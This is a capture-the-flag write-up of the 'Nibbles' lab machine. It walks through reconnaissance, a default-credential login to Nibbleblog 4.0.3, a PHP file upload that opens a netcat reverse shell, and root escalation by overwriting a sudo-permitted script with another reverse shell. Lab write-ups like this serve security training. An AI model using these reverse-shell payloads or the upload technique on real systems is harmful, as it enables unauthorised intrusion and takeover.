**NIBBLES**

Started with a standard nmap scan:

```
sudo nmap -sV 10.129.79.164
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Browsing to `http://10.129.79.164` we find a simple page with a "hello world!" message. Viewing the page source, we find a precious hint about a hidden directory:

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Let's browse to `http://10.129.79.164/nibbleblog`; the site seems to be powered by Nibbleblog.

Let's investigate further by fuzzing possible directories:

```
gobuster dir -u http://10.129.79.164/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50
```

We find a README directory that shows us the version of Nibbleblog:

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

Fuzzing directories reveals an admin login panel at `http://10.129.79.164/nibbleblog/admin.php`.

A quick search for default credentials for Nibbleblog reveals that the default credentials are `admin:nibbles`. Login was successful.

Let's search for common exploits to gain RCE or a reverse shell:

```
searchsploit nibble 4.0.3
```

```
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb
```

Since the Metasploit module was giving me problems, let's do it manually: let's go to Plugins --> My Image --> and create a new file with PHP code that points to our machine:

php

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.194 4444 >/tmp/f"); ?>
```

After receiving the connection, we find the `user.txt` flag in nibbler's directory.

We find a file in nibbler's directory called `personal.zip`.

Let's unzip it; inside `/personal.zip` we find a file called `monitor.sh`, which looks like a monitoring task.

Let's check user permissions with:

```
sudo -l
```

```
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We can overwrite `monitor.sh` by replacing its content with a reverse shell that runs with root privileges:

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.194 5555 >/tmp/f' > /home/nibbler/personal/stuff/monitor.sh
```

Let's start a listener on port 5555:

```
nc -lnvp 5555
```

Let's run it with:

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

We receive a root shell; let's get `root.txt` in the root directory.
